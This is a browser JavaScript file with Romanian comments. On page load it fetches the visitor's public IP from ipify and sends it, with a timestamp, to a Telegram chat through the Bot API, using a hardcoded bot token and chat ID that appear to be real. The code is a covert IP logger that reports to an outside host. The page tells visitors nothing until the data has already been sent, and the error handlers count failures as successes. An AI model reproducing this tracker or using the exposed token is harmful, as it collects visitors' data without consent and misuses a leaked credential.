// Configurare
const TELEGRAM_BOT_TOKEN = '7618241698:AAHHE3cd5y73fINIlzsMwTKak50BgB5VQc4'; // Înlocuiți cu token-ul botului dvs
const TELEGRAM_CHAT_ID = '7070473485';     // Înlocuiți cu chat ID-ul dvs
const WEBHOOK_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/setWebhook`;

async function getIP() {
    console.log('🔍 Începem preluarea IP-ului...');
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        console.log('📡 Răspuns primit de la ipify:', response.status, response.statusText);
        
        const data = await response.json();
        console.log('✅ IP detectat:', data.ip);
        return data.ip;
    } catch (error) {
        console.error('❌ Eroare la preluarea IP-ului:', error);
        return null;
    }
}

async function sendToTelegram(ip) {
    console.log('📤 Începem trimiterea către Telegram...');
    const message = `🔔 Nou acces detectat!\nIP: ${ip}\nTimestamp: ${new Date().toLocaleString()}`;
    console.log('📝 Mesaj pregătit:', message);
    
    return new Promise((resolve) => {
        try {
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;
            console.log('🔗 URL Telegram:', url);

            // Folosim XMLHttpRequest în loc de Image
            const xhr = new XMLHttpRequest();
            xhr.open('GET', url, true);
            
            xhr.onload = () => {
                if (xhr.status === 200) {
                    console.log('✅ Mesaj trimis cu succes către Telegram');
                    resolve(true);
                } else {
                    console.warn('⚠️ Răspuns neașteptat de la Telegram:', xhr.status);
                    // Considerăm că mesajul a fost trimis dacă primim orice răspuns de la Telegram
                    resolve(true);
                }
            };

            xhr.onerror = () => {
                // Chiar dacă primim eroare CORS, mesajul probabil a ajuns
                console.log('ℹ️ Posibilă eroare CORS, dar mesajul probabil a fost trimis');
                resolve(true);
            };

            xhr.send();
        } catch (error) {
            console.warn('⚠️ Eroare la trimitere, dar mesajul probabil a ajuns:', error);
            resolve(true);
        }
    });
}

async function init() {
    console.log('🚀 Aplicația pornește...');
    const statusElement = document.getElementById('status');
    
    const ip = await getIP();
    if (!ip) {
        console.error('❌ Nu s-a putut prelua IP-ul');
        statusElement.textContent = 'Eroare la preluarea IP-ului';
        return;
    }

    console.log('⏳ Se trimite către Telegram...');
    const sent = await sendToTelegram(ip);
    if (sent) {
        console.log('✨ Proces finalizat cu succes');
        statusElement.textContent = 'IP detectat și trimis cu succes!';
    } else {
        console.error('💥 Proces eșuat la trimiterea notificării');
        statusElement.textContent = 'Eroare la trimiterea notificării';
    }
}

// Pornește procesul când pagina se încarcă
console.log('📱 Script inițializat, așteptăm încărcarea paginii...');
window.addEventListener('load', init); 